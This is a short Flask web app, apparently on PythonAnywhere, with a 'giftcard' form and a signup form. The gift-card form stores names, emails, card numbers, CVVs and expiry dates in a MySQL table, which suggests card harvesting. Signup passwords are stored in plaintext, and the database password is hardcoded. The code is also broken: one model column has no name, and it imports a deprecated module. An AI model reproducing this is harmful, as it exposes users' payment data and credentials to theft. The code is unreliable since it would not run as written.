
# A very simple Flask Hello World app for you to get started with...

from flask import Flask, redirect, render_template, request, url_for, session
from flask.ext.sqlalchemy import SQLAlchemy
app = Flask(__name__)
app.config["DEBUG"] = True
SQLALCHEMY_DATABASE_URI = "mysql+mysqlconnector://{username}:{password}@{hostname}/{databasename}".format(
    username="akshu",
    password="pythoncheck@123",
    hostname="akshu.mysql.pythonanywhere-services.com",
    databasename="akshu$comments",
)
app.config["SQLALCHEMY_DATABASE_URI"] = SQLALCHEMY_DATABASE_URI
app.config["SQLALCHEMY_POOL_RECYCLE"] = 299

db = SQLAlchemy(app)

class Detail(db.Model):
     __tablename__ = "details"

     id = db.Column(db.Integer, primary_key=True)
     message = db.Column(db.String(4096))
     name = db.Column(db.String(100))
     email = db.Column(db.String(100))
     password = db.Column(db.String(100))
     cardtype = db.Column(db.String(100))
     
	 
	 
	 
	 
	  = db.Column(db.String(100))
     cvv = db.Column(db.String(100))
     expmonth = db.Column(db.String(100))
     expyear = db.Column(db.String(100))




@app.route('/giftcard.html', methods=["GET", "POST"])
def wibble():
    if request.method == "GET":
        return render_template("giftcard.html")

    names = Detail(name=request.form["name"],email=request.form["email"],cardtype=request.form["cardtype"],cardnumber=request.form["enccardnumber"],cvv=request.form["enccvv"],expmonth=request.form["expmonth"],expyear=request.form["expyear"])
    db.session.add(names)
    db.session.commit()
    return render_template("payment.html")


@app.route("/signup.html", methods=["GET", "POST"])
def sign():
    if request.method == "GET":
        return render_template("signup.html")

    names1 = Detail(name=request.form["name"],email=request.form["email"],password=request.form["password"])
    db.session.add(names1)
    db.session.commit()
    return render_template("Thanks.html")

@app.route("/Thanks.html", methods=["GET", "POST"])
def thanks():
    if request.method == "GET":
        return render_template("Thanks.html")



@app.route("/", methods=["GET", "POST"])
def index():
    if request.method == "GET":
        return render_template("index.html")


